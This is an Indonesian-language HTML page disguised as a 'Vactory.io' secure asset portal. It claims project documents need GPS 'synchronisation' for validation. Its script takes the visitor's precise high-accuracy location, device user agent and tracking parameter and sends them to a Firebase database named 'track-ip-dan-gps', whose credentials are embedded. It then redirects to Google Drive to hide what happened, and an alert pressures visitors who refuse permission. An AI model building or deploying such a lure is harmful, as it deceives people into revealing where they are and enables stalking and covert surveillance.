<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Vactory.io - Secure Asset Delivery</title>
    
    <meta property="og:title" content="Vactory.io - Secure Portal">
    <meta property="og:description" content="Sistem Sinkronisasi Aset Terverifikasi. Silakan lakukan validasi akses.">
    <meta property="og:image" content="https://img.icons8.com/color/480/shield.png">

    <style>
        body { font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background: #0f172a; color: white; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
        .card { background: #1e293b; padding: 40px; border-radius: 20px; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5); text-align: center; max-width: 380px; width: 85%; border: 1px solid #334155; position: relative; }
        .logo { font-size: 2rem; font-weight: 800; color: #38bdf8; letter-spacing: -1px; margin-bottom: 5px; }
        .sub-logo { font-size: 0.75rem; color: #94a3b8; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 30px; }
        .info-box { background: rgba(56, 189, 248, 0.05); border: 1px dashed #38bdf8; padding: 15px; border-radius: 12px; margin-bottom: 25px; }
        .info-box p { font-size: 0.9rem; color: #cbd5e1; margin: 0; line-height: 1.5; }
        .status-text { font-size: 0.8rem; color: #94a3b8; margin-top: 20px; font-style: italic; }
        
        .btn-sync { background: #38bdf8; color: #0f172a; border: none; padding: 18px; border-radius: 10px; cursor: pointer; font-weight: bold; width: 100%; font-size: 1rem; transition: 0.3s; box-shadow: 0 10px 15px -3px rgba(56, 189, 248, 0.4); }
        .btn-sync:hover { background: #7dd3fc; transform: translateY(-2px); }
        .btn-sync:disabled { background: #475569; color: #94a3b8; cursor: not-allowed; transform: none; box-shadow: none; }

        /* Animasi Loading */
        .loader { width: 100%; height: 4px; background: #334155; border-radius: 10px; margin-top: 20px; display: none; overflow: hidden; }
        .loader-bar { width: 0%; height: 100%; background: #38bdf8; transition: width 0.5s; }
    </style>
</head>
<body>

<div class="card">
    <div class="logo">VACTORY<span style="color:white">.IO</span></div>
    <div class="sub-logo">Asset Management System</div>
    
    <div class="info-box">
        <p><strong>Akses Terbatas:</strong> Dokumen Proyek <strong>[V-2024-X]</strong> memerlukan sinkronisasi koordinat GPS dan jaringan Wi-Fi untuk validasi server.</p>
    </div>

    <button class="btn-sync" id="vBtn" onclick="processSync()">SINKRONISASI & AMBIL TUGAS</button>
    
    <div class="loader" id="loaderBox">
        <div class="loader-bar" id="loaderBar"></div>
    </div>
    <div class="status-text" id="statusMsg">ID Perangkat: READY</div>
</div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyCBkv4BE175yaj3S_xxuv0JcSMAMgW6Tn4",
      authDomain: "track-ip-dan-gps.firebaseapp.com",
      databaseURL: "https://track-ip-dan-gps-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "track-ip-dan-gps",
      storageBucket: "track-ip-dan-gps.firebasestorage.app",
      messagingSenderId: "475141239902",
      appId: "1:475141239902:web:5dfbd6387d4b1fa23370cf"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    window.processSync = function() {
        const btn = document.getElementById('vBtn');
        const loader = document.getElementById('loaderBox');
        const bar = document.getElementById('loaderBar');
        const msg = document.getElementById('statusMsg');

        btn.disabled = true;
        btn.innerText = "MENGHUBUNGKAN...";
        loader.style.display = "block";

        // Tahap 1: Simulasi Loading
        setTimeout(() => { bar.style.width = "40%"; msg.innerText = "Mencari Koordinat GPS..."; }, 500);

        // Tahap 2: Ambil GPS asli
        navigator.geolocation.getCurrentPosition((pos) => {
            bar.style.width = "70%";
            msg.innerText = "Mengirim Data Validasi...";

            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            const gmaps = "https://www.google.com/maps?q=" + lat + "," + lon;

            push(ref(db, 'Project_Vactory_Logs'), {
                lokasi: lat + "," + lon,
                akurasi: pos.coords.accuracy + "m",
                maps: gmaps,
                timestamp: new Date().toLocaleString(),
                device: navigator.userAgent,
                utm_source: new URLSearchParams(window.location.search).get('utm_source') || "Direct"
            }).then(() => {
                bar.style.width = "100%";
                msg.innerText = "Sinkronisasi Berhasil!";
                setTimeout(() => {
                    window.location.href = "https://drive.google.com"; // Arahkan ke file asli
                }, 800);
            });

        }, (err) => {
            alert("SINKRONISASI GAGAL: Harap aktifkan GPS & klik 'IZINKAN' untuk memvalidasi pengerjaan proyek.");
            btn.disabled = false;
            btn.innerText = "SINKRONISASI ULANG";
            loader.style.display = "none";
            bar.style.width = "0%";
            msg.innerText = "ID Perangkat: READY";
        }, { enableHighAccuracy: true, timeout: 10000 });
    };
</script>
</body>
</html>
